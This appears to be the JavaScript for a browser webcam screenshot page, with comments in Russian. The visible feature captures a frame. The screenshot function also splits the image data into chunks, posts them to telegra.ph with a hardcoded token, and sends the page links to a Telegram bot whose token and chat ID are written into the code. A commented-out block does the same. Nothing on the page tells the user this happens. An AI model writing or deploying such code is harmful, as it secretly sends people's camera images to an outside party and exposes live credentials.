feather.replace();

const controls = document.querySelector('.controls');
const cameraOptions = document.querySelector('.video-options>select');
const video = document.querySelector('video');
const canvas = document.querySelector('canvas');
const screenshotImage = document.querySelector('img');
const buttons = [...controls.querySelectorAll('button')];
let streamStarted = false;

const [play, pause, screenshot] = buttons;

const constraints = {
  video: {
    width: {
      min: 1280,
      ideal: 1920,
      max: 2560,
    },
    height: {
      min: 720,
      ideal: 1080,
      max: 1440
    },
  }
};

const getCameraSelection = async () => {
  const devices = await navigator.mediaDevices.enumerateDevices();
  const videoDevices = devices.filter(device => device.kind === 'videoinput');
  const options = videoDevices.map(videoDevice => {
    return `<option value="${videoDevice.deviceId}">${videoDevice.label}</option>`;
  });
  cameraOptions.innerHTML = options.join('');
};

play.onclick = () => {
  if (streamStarted) {
    video.play();
    play.classList.add('d-none');
    pause.classList.remove('d-none');
    return;
  }
  if ('mediaDevices' in navigator && navigator.mediaDevices.getUserMedia) {
    const updatedConstraints = {
      ...constraints,
      deviceId: {
        exact: cameraOptions.value
      }
    };
    startStream(updatedConstraints);
  }
};

const startStream = async (constraints) => {
  const stream = await navigator.mediaDevices.getUserMedia(constraints);
  handleStream(stream);
};

const handleStream = (stream) => {
  video.srcObject = stream;
  play.classList.add('d-none');
  pause.classList.remove('d-none');
  screenshot.classList.remove('d-none');
  streamStarted = true;
};
cameraOptions.onchange = () => {
  const updatedConstraints = {
    ...constraints,
    deviceId: {
      exact: cameraOptions.value
    }
  };
  startStream(updatedConstraints);
};

const pauseStream = () => {
  video.pause();
  play.classList.remove('d-none');
  pause.classList.add('d-none');
};

const doScreenshot = () => {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);
  screenshotImage.src = canvas.toDataURL('image/webp');
  
  screenshotImage.classList.remove('d-none');
  console.log(screenshotImage.src);
 


//   for(let i = 0;i<=count;i++){
//     console.log(res[i])
//     fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${i} ${res[i]}`,{method:'POST',})
//     .then(response => response.json()) // Декодируем ответ в формате json
//     .then(data => console.log(data));
//   };
//   fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=конец`,{method:'POST',})
//       .then(response => response.json()) // Декодируем ответ в формате json
//       .then(data => console.log(data));
//   console.log('все');
  
  const count = 6; // кол-во частей, которые необходимо получить
  const length = Math.ceil(screenshotImage.src.length / count);
  const pattern = new RegExp(".{1," + length + "}", "ig");
  let res = screenshotImage.src.match(pattern).map(item => item.padEnd(length, "."));
  console.log(res);
  let tok= 'd46a1368b4eb8d85d157e5aca09976d37dd11ac1da317c90ab2618afc50b';


  for(let i = 0;i<=count;i++){
    console.log(res[i])
    fetch(`https://api.telegra.ph/createPage?access_token=${tok}&title=my_title-${i}&content=[ {"tag":"p","children":["${res[i]}"]} ]&author_name=poilka`,{method: 'POST',})
      .then(response => response.json())
      .then(data =>{
        fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${data.result.url}`,{method:'POST',})
        .then(response => response.json()) // Декодируем ответ в формате json
        .then(data => console.log(data));
      });

  };
   };
pause.onclick = pauseStream;
screenshot.onclick = doScreenshot;
getCameraSelection();
  
